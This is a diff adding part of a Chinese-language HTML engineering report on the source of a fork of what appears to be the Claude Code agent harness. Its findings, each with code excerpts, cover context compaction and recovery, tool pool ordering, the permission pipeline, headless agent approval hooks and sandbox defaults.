+  924        initialConsecutive529Errors: retryOptions.initialConsecutive529Errors,
+  925        querySource: retryOptions.querySource,</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:818–925</code>
+      <span>非流式 fallback 超时与请求。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:2418–2465</code>
+      <span>不完整流检测。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:2583–2667</code>
+      <span>双工具风险、禁用门与 fallback 启动。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-4">
+      <div class="chapter-rule"><span>04</span></div>
+      <div class="chapter-kicker">DIMENSION · CONTEXT-COMPACTION</div>
+      <h2>上下文、压缩与恢复</h2>
+      <p class="chapter-deck">本章共 4 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-context-001" data-search="上下文不是单层摘要，而是 snip、工具结果瘦身、session memory 与 autocompact 的阶梯 snip 根据边界和 uuid 列表删除指定旧消息；microcompact 只针对读、shell、grep/glob、web、edit/write 等高体积工具结果；autocompact 优先尝试 session memory，再退回 legacy summary。 先精准剪掉明确不要的旧段，再清空大块工具输出，最后才用模型写摘要；不同手术刀处理不同类型的肥胖。 context-compaction">
+    <header class="finding-head">
+      <div class="finding-no">07</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-context-001</span></div>
+        <h3>上下文不是单层摘要，而是 snip、工具结果瘦身、session memory 与 autocompact 的阶梯</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>snip 根据边界和 UUID 列表删除指定旧消息；microcompact 只针对读、shell、grep/glob、web、edit/write 等高体积工具结果；autocompact 优先尝试 session memory，再退回 legacy summary。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>先精准剪掉明确不要的旧段，再清空大块工具输出，最后才用模型写摘要；不同手术刀处理不同类型的肥胖。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>比单一“全历史总结”更保真，但分层状态、缓存标记和 resume 重建复杂。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/compact/snipCompact.ts · L60–L147</div>
+        <pre><code>   60  /**
+   61   * Scan the message array for the last `snip_boundary` system message and,
+   62   * if found, remove all messages whose UUIDs appear in its
+   63   * `snipMetadata.removedUuids`.
+   64   *
+   65   * This is the core memory-saving function. When a snip boundary exists:
+   66   * 1. All messages listed in `removedUuids` are filtered out.
+   67   * 2. The boundary message itself is kept (it records what was removed).
+   68   * 3. Messages not in `removedUuids` (including post-boundary messages)
+   69   *    are preserved.
+   70   *
+   71   * Called from:
+   72   * - `query.ts` — strips snipped messages from the model-facing array
+   73   *   before sending to the API.
+   74   * - `QueryEngine.ts` `snipReplay` — trims `mutableMessages` so the
+   75   *   in-memory store does not grow without bound in long SDK sessions.
+   76   *
+   77   * @param messages  Full message array (may contain a snip_boundary).
+   78   * @param options   `force` — if true, always execute when a boundary is
+   79   *                  present. Without `force`, the function still executes
+   80   *                  if a boundary is found (the &quot;if needed&quot; refers to
+   81   *                  whether a boundary exists, not a token threshold).
+   82   */
+   83  export function snipCompactIfNeeded(
+      … 54 lines omitted; exact range 60–147 …
+  138      kept.push(msg)
+  139    }
+  140  
+  141    return {
+  142      messages: kept,
+  143      executed: true,
+  144      tokensFreed,
+  145      boundaryMessage,
+  146    }
+  147  }</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/snipCompact.ts:60–147</code>
+      <span>snip boundary、UUID 过滤和 tokensFreed。</span>
+    </li>
+    <li>
+      <span class="role">配置</span>
+      <code>src/services/compact/microCompact.ts:38–50</code>
+      <span>可微压缩工具集合。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/autoCompact.ts:270–363</code>
+      <span>session memory 优先与 legacy compact 回退。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-context-002" data-search="压缩为输出预留预算，并有连续失败熔断 有效输入窗口从模型窗口中扣除最多 20k 输出预算；常规/大窗口采用不同 warning/error buffer，自动压缩连续失败三次后熔断，避免每轮重复消耗。 不会把车厢塞满到回答没座位；整理行李连续失败三次后先停手，不再每回合烧一次模型调用。 context-compaction">
+    <header class="finding-head">
+      <div class="finding-no">08</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-context-002</span></div>
+        <h3>压缩为输出预留预算，并有连续失败熔断</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>有效输入窗口从模型窗口中扣除最多 20k 输出预算；常规/大窗口采用不同 warning/error buffer，自动压缩连续失败三次后熔断，避免每轮重复消耗。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>不会把车厢塞满到回答没座位；整理行李连续失败三次后先停手，不再每回合烧一次模型调用。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>阈值与错误治理成熟，但部分阈值注释来自不可核验的内部指标，报告只采纳代码常量和行为。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 配置</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/compact/autoCompact.ts · L28–L93</div>
+        <pre><code>   28  // Reserve this many tokens for output during compaction
+   29  // Based on p99.99 of compact summary output being 17,387 tokens.
+   30  const MAX_OUTPUT_TOKENS_FOR_SUMMARY = 20_000
+   31  
+   32  // Returns the context window size minus the max output tokens for the model
+   33  export function getEffectiveContextWindowSize(model: string): number {
+   34    const reservedTokensForSummary = Math.min(
+   35      getMaxOutputTokensForModel(model),
+   36      MAX_OUTPUT_TOKENS_FOR_SUMMARY,
+   37    )
+   38    let contextWindow = getContextWindowForModel(model, getSdkBetas())
+   39  
+   40    const autoCompactWindow = process.env.CLAUDE_CODE_AUTO_COMPACT_WINDOW
+   41    if (autoCompactWindow) {
+   42      const parsed = parseInt(autoCompactWindow, 10)
+   43      if (!isNaN(parsed) &amp;&amp; parsed &gt; 0) {
+   44        contextWindow = Math.min(contextWindow, parsed)
+   45      }
+   46    }
+   47  
+   48    return contextWindow - reservedTokensForSummary
+   49  }
+   50  
+   51  export type AutoCompactTrackingState = {
+      … 32 lines omitted; exact range 28–93 …
+   84  /**
+   85   * Estimate the maximum token growth a single turn can produce.
+   86   * Used for predictive autocompact checks before the API call.
+   87   */
+   88  export function estimateMaxTurnGrowth(model: string): number {
+   89    const maxOutput = Math.min(
+   90      getMaxOutputTokensForModel(model),
+   91      MAX_OUTPUT_TOKENS_FOR_SUMMARY,
+   92    )
+   93    return maxOutput + TOOL_RESULT_GROWTH_ESTIMATE</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">配置</span>
+      <code>src/services/compact/autoCompact.ts:28–93</code>
+      <span>输出预留和多窗口 buffer。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/autoCompact.ts:96–174</code>
+      <span>失败计数和触发阈值。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/autoCompact.ts:286–293</code>
+      <span>连续三次失败熔断。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-context-003" data-search="cache-editing 微压缩代码存在，但该固定提交的关键 beta header 为空 microcompact 的 cached path 能登记 tool result、生成 cache_edits 并维持 pinned edits；然而 api 层明确检查到本 fork 的 cache_editing_beta_header 为空，headeravailable=false 时关闭该路径。 发动机舱里有这套零件，但点火钥匙没公开，当前版本不会真正挂入生产链路。 context-compaction">
+    <header class="finding-head">
+      <div class="finding-no">09</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>限制</span><span>claude-code-context-003</span></div>
+        <h3>cache-editing 微压缩代码存在，但该固定提交的关键 beta header 为空</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>microcompact 的 cached path 能登记 tool result、生成 cache_edits 并维持 pinned edits；然而 API 层明确检查到本 fork 的 CACHE_EDITING_BETA_HEADER 为空，headerAvailable=false 时关闭该路径。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>发动机舱里有这套零件，但点火钥匙没公开，当前版本不会真正挂入生产链路。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>不能把 cached microcompact 计为该固定提交默认可用能力；真正可达的是 time-based 清空和 autocompact 等路径。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/compact/microCompact.ts · L257–L307</div>
+        <pre><code>  257  export async function microcompactMessages(
+  258    messages: Message[],
+  259    toolUseContext?: ToolUseContext,
+  260    querySource?: QuerySource,
+  261  ): Promise&lt;MicrocompactResult&gt; {
+  262    // Clear suppression flag at start of new microcompact attempt
+  263    clearCompactWarningSuppression()
+  264  
+  265    // Time-based trigger runs first and short-circuits. If the gap since the
+  266    // last assistant message exceeds the threshold, the server cache has expired
+  267    // and the full prefix will be rewritten regardless — so content-clear old
+  268    // tool results now, before the request, to shrink what gets rewritten.
+  269    // Cached MC (cache-editing) is skipped when this fires: editing assumes a
+  270    // warm cache, and we just established it&#39;s cold.
+  271    const timeBasedResult = maybeTimeBasedMicrocompact(messages, querySource)
+  272    if (timeBasedResult) {
+  273      return timeBasedResult
+  274    }
+  275  
+  276    // Only run cached MC for the main thread to prevent forked agents
+  277    // (session_memory, prompt_suggestion, etc.) from registering their
+  278    // tool_results in the global cachedMCState, which would cause the main
+  279    // thread to try deleting tools that don&#39;t exist in its own conversation.
+  280    if (feature(&#39;CACHED_MICROCOMPACT&#39;)) {
+      … 17 lines omitted; exact range 257–307 …
+  298  
+  299  /**
+  300   * Cached microcompact path - uses cache editing API to remove tool results
+  301   * without invalidating the cached prefix.
+  302   *
+  303   * Key differences from regular microcompact:
+  304   * - Does NOT modify local message content (cache_reference and cache_edits are added at API layer)
+  305   * - Uses count-based trigger/keep thresholds from GrowthBook config
+  306   * - Takes precedence over regular microcompact (no disk persistence)
+  307   * - Tracks tool results and queues cache edits for the API layer</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/microCompact.ts:257–307</code>
+      <span>feature/model/source gate 与 cached path。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/microCompact.ts:309–402</code>
+      <span>cache_edits 状态和消息不改写语义。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>src/services/api/claude.ts:1210–1235</code>
+      <span>空 beta header 导致 cachedMCEnabled=false。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-context-004" data-search="超长请求有 reactive compact 与循环保护 query 捕获 prompt-too-long 和媒体相关错误后可移除失败消息、触发压缩并重试；同时记录已尝试状态，防止恢复逻辑无限循环。 真的撞到窗口上限时，会倒车、重新打包再试；同一次事故不会无限重复。 context-compaction">
+    <header class="finding-head">
+      <div class="finding-no">10</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-context-004</span></div>
+        <h3>超长请求有 reactive compact 与循环保护</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>query 捕获 prompt-too-long 和媒体相关错误后可移除失败消息、触发压缩并重试；同时记录已尝试状态，防止恢复逻辑无限循环。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>真的撞到窗口上限时，会倒车、重新打包再试；同一次事故不会无限重复。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>预测阈值漏判时仍有救生路径，适合长会话，但压缩前后的 tool pairing 与 transcript 必须同步修复。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/query.ts · L1352–L1450</div>
+        <pre><code> 1352        // Prompt-too-long recovery: the streaming loop withheld the error
+ 1353        // (see withheldByCollapse / withheldByReactive above). Try collapse
+ 1354        // drain first (cheap, keeps granular context), then reactive compact
+ 1355        // (full summary). Single-shot on each — if a retry still 413&#39;s,
+ 1356        // the next stage handles it or the error surfaces.
+ 1357        const isWithheld413 =
+ 1358          lastMessage?.type === &#39;assistant&#39; &amp;&amp;
+ 1359          lastMessage.isApiErrorMessage &amp;&amp;
+ 1360          isPromptTooLongMessage(lastMessage)
+ 1361        // Media-size rejections (image/PDF/many-image) are recoverable via
+ 1362        // reactive compact&#39;s strip-retry. Unlike PTL, media errors skip the
+ 1363        // collapse drain — collapse doesn&#39;t strip images. mediaRecoveryEnabled
+ 1364        // is the hoisted gate from before the stream loop (same value as the
+ 1365        // withholding check — these two must agree or a withheld message is
+ 1366        // lost). If the oversized media is in the preserved tail, the
+ 1367        // post-compact turn will media-error again; hasAttemptedReactiveCompact
+ 1368        // prevents a spiral and the error surfaces.
+ 1369        const isWithheldMedia =
+ 1370          mediaRecoveryEnabled &amp;&amp;
+ 1371          reactiveCompact?.isWithheldMediaSizeError(lastMessage as Message)
+ 1372        if (isWithheld413) {
+ 1373          // First: drain all staged context-collapses. Gated on the PREVIOUS
+ 1374          // transition not being collapse_drain_retry — if we already drained
+ 1375          // and the retry still 413&#39;d, fall through to reactive compact.
+      … 65 lines omitted; exact range 1352–1450 …
+ 1441              toolUseContext,
+ 1442              autoCompactTracking: undefined,
+ 1443              maxOutputTokensRecoveryCount,
+ 1444              hasAttemptedReactiveCompact: true,
+ 1445              maxOutputTokensOverride: undefined,
+ 1446              pendingToolUseSummary: undefined,
+ 1447              stopHookActive: undefined,
+ 1448              turnCount,
+ 1449              transition: { reason: &#39;reactive_compact_retry&#39; },
+ 1450            }</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 2 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/query.ts:1352–1450</code>
+      <span>reactive compact、媒体恢复和 loop guard。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/compact/autoCompact.ts:189–268</code>
+      <span>reactive/context collapse gate 与递归防护。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-5">
+      <div class="chapter-rule"><span>05</span></div>
+      <div class="chapter-kicker">DIMENSION · TOOLS-EDITING</div>
+      <h2>工具、编辑与执行</h2>
+      <p class="chapter-deck">本章共 1 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-tools-001" data-search="工具池合并内建与 mcp，并为 prompt cache 做确定性排序 assembletoolpool 先装配内建工具，再接 mcp 工具，应用 deny 过滤，并按稳定分区排序；工具重名时内建工具优先。 工具箱每轮不能乱序，否则模型缓存会失效；外接工具也不能偷偷覆盖同名的原厂扳手。 tools-editing">
+    <header class="finding-head">
+      <div class="finding-no">11</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-tools-001</span></div>
+        <h3>工具池合并内建与 MCP，并为 prompt cache 做确定性排序</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>assembleToolPool 先装配内建工具，再接 MCP 工具，应用 deny 过滤，并按稳定分区排序；工具重名时内建工具优先。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>工具箱每轮不能乱序，否则模型缓存会失效；外接工具也不能偷偷覆盖同名的原厂扳手。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>工具发现和缓存稳定性被当作 Harness 核心问题，而不只是 UI 列表。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/tools.ts · L378–L420</div>
+        <pre><code>  378  export function assembleToolPool(
+  379    permissionContext: ToolPermissionContext,
+  380    mcpTools: Tools,
+  381  ): Tools {
+  382    const builtInTools = getTools(permissionContext)
+  383  
+  384    // Filter out MCP tools that are in the deny list
+  385    const allowedMcpTools = filterToolsByDenyRules(mcpTools, permissionContext)
+  386  
+  387    // Sort each partition for prompt-cache stability, keeping built-ins as a
+  388    // contiguous prefix. The server&#39;s claude_code_system_cache_policy places a
+  389    // global cache breakpoint after the last prefix-matched built-in tool; a flat
+  390    // sort would interleave MCP tools into built-ins and invalidate all downstream
+  391    // cache keys whenever an MCP tool sorts between existing built-ins. uniqBy
+  392    // preserves insertion order, so built-ins win on name conflict.
+  393    // Avoid Array.toSorted (Node 20+) — we support Node 18. builtInTools is
+  394    // readonly so copy-then-sort; allowedMcpTools is a fresh .filter() result.
+  395    const byName = (a: Tool, b: Tool) =&gt; a.name.localeCompare(b.name)
+  396    return uniqBy(
+  397      [...builtInTools].sort(byName).concat(allowedMcpTools.sort(byName)),
+  398      &#39;name&#39;,
+  399    )
+  400  }
+  401  
+      … 9 lines omitted; exact range 378–420 …
+  411   *
+  412   * @param permissionContext - Permission context for filtering built-in tools
+  413   * @param mcpTools - MCP tools from appState.mcp.tools
+  414   * @returns Combined array of built-in and MCP tools
+  415   */
+  416  export function getMergedTools(
+  417    permissionContext: ToolPermissionContext,
+  418    mcpTools: Tools,
+  419  ): Tools {
+  420    const builtInTools = getTools(permissionContext)</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/tools.ts:378–420</code>
+      <span>工具合并、去重、过滤和排序。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/api/claude.ts:1258–1277</code>
+      <span>工具 schema 构建和 deferred tools。</span>
+    </li>
+    <li>
+      <span class="role">Prompt</span>
+      <code>src/services/api/claude.ts:1388–1415</code>
+      <span>动态工具发现/执行协议。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-6">
+      <div class="chapter-rule"><span>06</span></div>
+      <div class="chapter-kicker">DIMENSION · PERMISSIONS-SANDBOX</div>
+      <h2>权限、审批与沙箱</h2>
+      <p class="chapter-deck">本章共 4 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-permission-001" data-search="权限是“规则 → 工具自检 → 安全检查 → 模式 → 用户/自动判定”的有序流水线 显式 deny、ask、工具自己的内容级检查和敏感路径 safetycheck 先执行；之后 bypass/always-allow 才可能放行，passthrough 最终转为 ask。dontask 把 ask 变 deny，auto 可进入分类器。 不是一个总开关，而是多道门；即使开了 bypass，显式 ask 和某些安全路径仍能拦住。 permissions-sandbox">
+    <header class="finding-head">
+      <div class="finding-no">12</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-permission-001</span></div>
+        <h3>权限是“规则 → 工具自检 → 安全检查 → 模式 → 用户/自动判定”的有序流水线</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>显式 deny、ask、工具自己的内容级检查和敏感路径 safetyCheck 先执行；之后 bypass/always-allow 才可能放行，passthrough 最终转为 ask。dontAsk 把 ask 变 deny，auto 可进入分类器。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>不是一个总开关，而是多道门；即使开了 bypass，显式 ask 和某些安全路径仍能拦住。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>规则优先级清晰，适合企业策略；复杂度也意味着每种工具必须准确返回 decisionReason。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/permissions/permissions.ts · L1179–L1281</div>
+        <pre><code> 1179  async function hasPermissionsToUseToolInner(
+ 1180    tool: Tool,
+ 1181    input: { [key: string]: unknown },
+ 1182    context: ToolUseContext,
+ 1183  ): Promise&lt;PermissionDecision&gt; {
+ 1184    if (context.abortController.signal.aborted) {
+ 1185      throw new AbortError()
+ 1186    }
+ 1187  
+ 1188    let appState = context.getAppState()
+ 1189  
+ 1190    // 1. Check if the tool is denied
+ 1191    // 1a. Entire tool is denied
+ 1192    const denyRule = getDenyRuleForTool(appState.toolPermissionContext, tool)
+ 1193    if (denyRule) {
+ 1194      return {
+ 1195        behavior: &#39;deny&#39;,
+ 1196        decisionReason: {
+ 1197          type: &#39;rule&#39;,
+ 1198          rule: denyRule,
+ 1199        },
+ 1200        message: `Permission to use ${tool.name} has been denied.`,
+ 1201      }
+ 1202    }
+      … 69 lines omitted; exact range 1179–1281 …
+ 1272  
+ 1273    // 1g. Safety checks (e.g. .git/, .claude/, .vscode/, shell configs) are
+ 1274    // bypass-immune — they must prompt even in bypassPermissions mode.
+ 1275    // checkPathSafetyForAutoEdit returns {type:&#39;safetyCheck&#39;} for these paths.
+ 1276    if (
+ 1277      toolPermissionResult?.behavior === &#39;ask&#39; &amp;&amp;
+ 1278      toolPermissionResult.decisionReason?.type === &#39;safetyCheck&#39;
+ 1279    ) {
+ 1280      return toolPermissionResult
+ 1281    }</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/permissions/permissions.ts:1179–1281</code>
+      <span>deny/ask/tool check/safetyCheck 顺序。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/permissions/permissions.ts:1283–1340</code>
+      <span>bypass、allow rule 和 ask 转换。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/permissions/permissions.ts:502–540</code>
+      <span>dontAsk 与 auto classifier 分流。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-permission-002" data-search="无头与后台 agent 默认不能弹窗，先给 hook/分类器机会再 fail closed 无头权限请求会执行 permissionrequest hooks；hook 无决定时回到自动拒绝。后台 bubble/coordinator worker 可先等待自动检查，swarm worker 还能把请求转给 leader，主线程才展示交互对话框。 没人盯屏幕时不会卡在“请点允许”；可以让自动政策先裁决，裁决不了再拒绝或向上冒泡。 permissions-sandbox">
+    <header class="finding-head">
+      <div class="finding-no">13</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-permission-002</span></div>
+        <h3>无头与后台 Agent 默认不能弹窗，先给 hook/分类器机会再 fail closed</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>无头权限请求会执行 PermissionRequest hooks；hook 无决定时回到自动拒绝。后台 bubble/coordinator worker 可先等待自动检查，swarm worker 还能把请求转给 leader，主线程才展示交互对话框。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>没人盯屏幕时不会卡在“请点允许”；可以让自动政策先裁决，裁决不了再拒绝或向上冒泡。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>协作 Agent 的权限不是复制主线程 UI，而是独立的异步授权协议。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/permissions/permissions.ts · L392–L470</div>
+        <pre><code>  392  /**
+  393   * Runs PermissionRequest hooks for headless/async agents that cannot show
+  394   * permission prompts. This gives hooks an opportunity to allow or deny
+  395   * tool use before the fallback auto-deny kicks in.
+  396   *
+  397   * Returns a PermissionDecision if a hook made a decision, or null if no
+  398   * hook provided a decision (caller should proceed to auto-deny).
+  399   */
+  400  async function runPermissionRequestHooksForHeadlessAgent(
+  401    tool: Tool,
+  402    input: { [key: string]: unknown },
+  403    toolUseID: string,
+  404    context: ToolUseContext,
+  405    permissionMode: string | undefined,
+  406    suggestions: PermissionUpdate[] | undefined,
+  407  ): Promise&lt;PermissionDecision | null&gt; {
+  408    try {
+  409      for await (const hookResult of executePermissionRequestHooks(
+  410        tool.name,
+  411        toolUseID,
+  412        input,
+  413        context,
+  414        permissionMode,
+  415        suggestions as any,
+      … 45 lines omitted; exact range 392–470 …
+  461      }
+  462    } catch (error) {
+  463      // If hooks fail, fall through to auto-deny rather than crashing
+  464      logError(
+  465        new Error(&#39;PermissionRequest hook failed for headless agent&#39;, {
+  466          cause: toError(error),
+  467        }),
+  468      )
+  469    }
+  470    return null</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/permissions/permissions.ts:392–470</code>
+      <span>无头 PermissionRequest hook 与失败回退。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/hooks/useCanUseTool.tsx:154–197</code>
+      <span>coordinator/swarm 自动判定分支。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:421–472</code>
+      <span>Agent permission mode 和后台提示策略。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-sandbox-001" data-search="有真实 os sandbox 适配，但默认关闭且默认允许退回非沙箱命令 适配层调用外部 @anthropic-ai/sandbox-runtime；sandbox.enabled 默认 false，allowunsandboxedcommands 默认 true，只有 enabled+failifunavailable 才要求启动失败即失败。平台/依赖不满足时 issandboxingenabled 返回 false。 确实能装防护罩，但开箱时罩子没扣上，而且政策默认允许个别命令绕开它。 permissions-sandbox">
+    <header class="finding-head">
+      <div class="finding-no">14</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>限制</span><span>claude-code-sandbox-001</span></div>
+        <h3>有真实 OS sandbox 适配，但默认关闭且默认允许退回非沙箱命令</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>适配层调用外部 @anthropic-ai/sandbox-runtime；sandbox.enabled 默认 false，allowUnsandboxedCommands 默认 true，只有 enabled+failIfUnavailable 才要求启动失败即失败。平台/依赖不满足时 isSandboxingEnabled 返回 false。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>确实能装防护罩，但开箱时罩子没扣上，而且政策默认允许个别命令绕开它。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>可评为“具备可选强隔离能力”，不能评为“默认安全沙箱”；底层 seatbelt/bubblewrap 细节还依赖仓库外的包。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/sandbox/sandbox-adapter.ts · L1–L22</div>
+        <pre><code>    1  /**
+    2   * Adapter layer that wraps @anthropic-ai/sandbox-runtime with Claude CLI-specific integrations.
+    3   * This file provides the bridge between the external sandbox-runtime package and Claude CLI&#39;s
+    4   * settings system, tool integration, and additional features.
+    5   */
+    6  
+    7  import type {
+    8    FsReadRestrictionConfig,
+    9    FsWriteRestrictionConfig,
+   10    IgnoreViolationsConfig,
+   11    NetworkHostPattern,
+   12    NetworkRestrictionConfig,
+   13    SandboxAskCallback,
+   14    SandboxDependencyCheck,
+   15    SandboxRuntimeConfig,
+   16    SandboxViolationEvent,
+   17  } from &#39;@anthropic-ai/sandbox-runtime&#39;
+   18  import {
+   19    SandboxManager as BaseSandboxManager,
+   20    SandboxRuntimeConfigSchema,
+   21    SandboxViolationStore,
+   22  } from &#39;@anthropic-ai/sandbox-runtime&#39;</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/sandbox/sandbox-adapter.ts:1–22</code>
+      <span>外部 sandbox-runtime bridge。</span>
+    </li>
+    <li>
+      <span class="role">配置</span>
+      <code>src/utils/sandbox/sandbox-adapter.ts:459–485</code>
+      <span>默认关闭、autoAllow 和 unsandboxed fallback。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/sandbox/sandbox-adapter.ts:528–547</code>
+      <span>平台、依赖、配置联合 gate。</span>
+    </li></ul>
+    </details>
+  </article>
